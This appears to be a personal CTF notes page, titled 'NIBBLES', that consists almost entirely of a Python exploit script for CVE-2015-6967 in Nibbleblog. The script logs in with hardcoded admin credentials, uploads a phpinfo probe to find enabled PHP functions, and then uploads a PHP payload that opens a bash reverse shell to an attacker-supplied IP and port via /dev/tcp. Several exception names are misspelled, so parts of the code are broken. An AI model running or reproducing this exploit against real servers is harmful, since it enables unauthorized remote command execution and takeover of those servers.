---
Primary_category: "[[MACHINES]]"
title: "NIBBLES"
draft: false
banner: https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[MACHINES]]

#### *CVE-2015-6967*

```python
#!/usr/bin/env python3

import requests, sys, re
import argparse
from colorama import Fore, Style

def checkIP(ip):

    pattern = r"^\d{1,3}(\.\d{1,3}){3}$"

    if not re.match(pattern, ip):
        raise argparse.ArgumentTypeError(
            f"{Fore.RED}\n\n[!] The IP Address specified is not a valid one: {ip}{Style.RESET_ALL}"
        )

    return ip

class NibbleBlog():

    def __init__(self, target, attacker, port):

        self.target = target
        self.attacker = attacker
        self.port = port
        self.main_url = f"http://{self.target}/nibbleblog/admin.php"
        self.s = requests.Session()

    def start(self):

        try:
            self.doLogin()

        except RuntimeError as e:
            print(f"{Fore.RED}[!] An error has ocurred during login: {e}{Style.RESET_ALL}")

    def doLogin(self):

        data = {
                'username' : 'admin',
                'password' : 'nibbles'
        }

        try:
            r = self.s.post(self.main_url, data=data)

            if r.ok:
                print(Fore.GREEN + f'[+] Succesfull Status Code: {Fore.CYAN}{r.status_code}' + Style.RESET_ALL)

                if "Incorrect username or password." not in r.text:
                    print(f'{Fore.GREEN}[+] Login Succesfull{Style.RESET_ALL}')

                else:
                    print(Fore.RED + '[!] Username or Password Incorrect' + Style.RESET_ALL)
                    sys.exit()

            else:
                raise RuntimeEror(f"{Fore.RED}[!] Login failed with Status Code: {Fore.MAGENTA}{r.status_code}" + Style.RESET_ALL)

        except requests.exception.ConnectionError as e:
            print(Fore.RED + f"[!] Connection Error: {e}" + Style.RESET_ALL)

        except requests.exception.Timeout as e:
            print(Fore.RED + f"[!] Timeout: {e}" + Style.RESET_ALL)

    def uploadPayload(self, payload):

        params = {
            'controller' : 'plugins',
            'action' : 'config',
            'plugin' : 'my_image'
        }

        data = {
            'plugin' : 'my_image',
            'title' : 'test',
            'position' : '4',
            'caption' : 'test',
            'image_resize' : '1',
            'image_width' : '230',
            'image_height' : '200',
            'image_option' : 'auto'
        }

        file = {
            'image' : ('payload.php', f'{payload}', 'application/x-php')
        }

        try:
            r = self.s.post(self.main_url, params=params, data=data, files=file)

            if r.ok:
                print(Fore.GREEN + f"[+] Succesfull Status Code uploading the payload ({payload}): {Fore.MAGENTA}{r.status_code}" + Style.RESET_ALL)

                if "Changes has been saved successfully" in r.text:
                    print(Fore.GREEN + "[+] Payload uploaded successfully" + Style.RESET_ALL)
                else:
                    print(f"{Fore.RED}[!] Could not upload the payload{Style.RESET_ALL}")
                    sys.exit()

            else:
                print(f"{Fore.RED}[!] Unsuccessfull Status Code uploading the payload: {Fore.MAGENTA}{r.status_code}{Style.RESET_ALL}")
                sys.exit()

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[!] An error has occurred trying to upload the payload\nError: {e}" + Style.RESET_ALL)
            sys.exit()

    def getEnabledFunctions(self):

        self.payload_url = f"http://{self.target}/nibbleblog/content/private/plugins/my_image/image.php"

        dangerous_functions = [
            'pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited',
            'pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus',
            'pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler',
            'pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask',
            'pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority',
            'pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru',
            'link','symlink','syslog','ld','mail'
        ]

        try:
            r = self.s.get(self.payload_url)

            if r.ok:

                disabled_functions = re.findall(r'disable_functions</td><td class="v">([^<]+(?=,</td>))', r.text)

            else:
                print(Fore.RED + f"[!] Unsucessfull Status Code trying to load the payload content: {Fore.MAGENTA}{r.status_code}{Style.RESET_ALL}")
                sys.exit()

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"An error ocurred trying to load the payload content: {e}" + Style.RESET_ALL)
            sys.exit()

        self.enabled_functions = list(set(dangerous_functions) - set(disabled_functions))

    def execCommand(self):

        functions = ['system', 'shell_exec', 'exec']

        if any(f in self.enabled_functions for f in functions):

            payload = f"<?php system('bash -c \"bash -i &> /dev/tcp/{self.attacker}/{self.port} 0>&1\"'); ?>"

            self.uploadPayload(payload)

        try:
            r = self.s.get(self.payload_url)

            if r.ok:
                print(Fore.CYAN + r.text + Style.RESET_ALL)

            else:
                print(f"{Fore.RED}[!] Error in the Server Response - Status Code: {Fore.MAGENTA}{r.status_code}{Style.RESET_ALL}")
                sys.exit()
            
        except requests.exceptions.RequestExceptions as e:

            print(f"{Fore.RED}[!] Error has occurred trying to retrieve the payload ({Fore.MAGENTA}{payload}{Style.RESET_ALL})")
            sys.exit()


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description = 'This script exploits the CVE-2015-6967 Vulnerability'
    )

    parser.add_argument('target', action='store', type=checkIP, help='Target IP Address')

    parser.add_argument('attacker', action='store', type=checkIP, help='Attacker IP Address')

    parser.add_argument('lport', action='store', help='Attacker Listen Port')

    if len(sys.argv) == 1:

        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    exploit = NibbleBlog(options.target, options.attacker, options.lport)
    exploit.start()
    phpinfo = "<?php phpinfo(); ?>"

    exploit.uploadPayload(phpinfo)
    exploit.getEnabledFunctions()

    exploit.execCommand()
```